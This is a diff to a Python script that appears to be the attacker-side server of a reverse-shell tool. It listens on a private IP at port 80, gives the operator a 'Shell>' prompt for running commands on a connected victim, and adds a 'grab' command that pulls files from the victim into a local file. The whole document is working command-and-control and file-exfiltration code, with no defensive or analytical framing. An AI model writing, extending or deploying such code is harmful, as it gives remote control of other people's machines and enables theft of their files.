@@ -1,7 +1,41 @@
 import socket
+import sys
 
 HOST = "172.16.42.137"
 PORT = 80
+
+def transfer(connection, command):
+    connection.send(command)
+
+    with open('file.data', 'wb') as f:
+        print('[+] File transfer started')
+        while True:
+            try:
+                data = connection.recv(1024)
+                if data.decode().endswith('DONE'):
+                    print('[+] File grabbed successfully.')
+                    break
+                
+                f.write(data)
+                sys.stdout.write('.')
+            except Exception as e:
+                print(f'[-] Failed to grab file {str(e)}')
+                return
+    print('[+] File transfer completed')
+
+def execute_command(conn, command):
+    try:
+        conn.send(command.encode())
+        print(conn.recv(4096).decode())
+    except BrokenPipeError as bre:
+        print('[-] Client disconnected')
+        exit(1)
+    except ConnectionResetError as cre:
+        print('[-] Client disconnected')
+        exit(1)
+    except KeyboardInterrupt as kre:
+        print('\n[+] Exiting ...')
+        exit()
 
 def listen():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -16,23 +50,21 @@ def listen():
     print(f'[+] Client connected: {addr}')
 
     while True:
-        command = input('Shell> ')
+        try:
+            command = input('Shell> ')
+        except KeyboardInterrupt as ke:
+            print('[+] Exiting ...')
+            exit(0)
         
         if 'terminate' in command:
             conn.send('terminate'.encode())
             print('[+] Connection closed')
             conn.close()
             break
-        
-        try:
-            conn.send(command.encode())
-            print(conn.recv(4096).decode())
-        except BrokenPipeError as bre:
-            print('[-] Client accidentally disconnected')
-            exit(1)
-        except KeyboardInterrupt as ke:
-            print('[+] Exiting ...')
-            exit(0)
+        elif 'grab' in command:
+            transfer(conn, command.encode())
+        else:
+            execute_command(conn, command)
     
 def main():
     listen()
